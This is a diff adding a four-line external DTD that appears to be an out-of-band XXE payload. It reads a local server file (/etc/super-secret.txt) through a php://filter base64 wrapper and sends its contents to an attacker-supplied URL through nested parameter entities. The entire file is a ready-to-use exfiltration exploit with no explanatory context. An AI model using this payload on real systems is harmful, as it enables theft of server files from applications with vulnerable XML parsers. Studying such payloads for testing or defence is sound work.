@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/super-secret.txt">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "%url;/?p=%payload;">'>
+%param1;
+%external;
